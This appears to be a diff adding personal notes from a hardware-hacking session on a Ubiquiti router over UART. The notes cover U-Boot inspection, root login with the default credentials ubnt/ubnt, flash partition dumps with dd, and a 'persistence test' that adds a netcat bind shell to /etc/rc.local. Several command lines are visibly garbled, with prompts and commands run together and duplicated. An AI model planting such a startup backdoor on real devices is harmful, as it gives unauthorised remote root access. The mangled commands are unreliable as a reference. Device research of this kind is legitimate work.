@@ -1,0 +1,35 @@
+Commands executed during analysis
+U-Boot (interrupted)
+
+Hit any key to stop autoboot: 0
+ar7240> printenv
+ar7240> help
+ar7240> flinfo
+ar7240> mtdparts
+Linux (root shell via UART)
+after login: ubnt / ubnt
+
+ubnt@UBNT-BZ:~$ id
+uid=0(ubnt) gid=0(root) groups=0(root)
+
+ubnt@UBNT-BZ:~cat/proc/mtdubnt@UBNT−BZ: cat/proc/mtdubnt@UBNT−BZ:  cat /etc/openwrt_release
+ubnt@UBNT-BZ:~cat/proc/cpuinfoubnt@UBNT−BZ: cat/proc/cpuinfoubnt@UBNT−BZ:  netstat -tulpn
+ubnt@UBNT-BZ:~$ ps
+Firmware dump
+
+ubnt@UBNT-BZ:~ddif=/dev/mtd0of=/tmp/u−boot.binubnt@UBNT−BZ: ddif=/dev/mtd0of=/tmp/u−boot.binubnt@UBNT−BZ:  dd if=/dev/mtd1 of=/tmp/u-boot-env.bin
+ubnt@UBNT-BZ:~ddif=/dev/mtd2of=/tmp/kernel.binubnt@UBNT−BZ: ddif=/dev/mtd2of=/tmp/kernel.binubnt@UBNT−BZ:  dd if=/dev/mtd3 of=/tmp/cfg.bin
+ubnt@UBNT-BZ:~$ dd if=/dev/mtd4 of=/tmp/EEPROM.bin
+Transfer to PC (from PC side)
+
+scp -o HostKeyAlgorithms=+ssh-rsa ubnt@192.168.1.88:"/tmp/*.bin" .
+Persistence test
+
+ubnt@UBNT-BZ:~ echo 'nc -l -p 4444 -e /bin/sh &' >> /etc/rc.local ubnt@UBNT-BZ:~ reboot
+After reboot, from PC:
+
+nc 192.168.1.88 4444
+id # root again
+
+
+But I failed, I'll have to try again
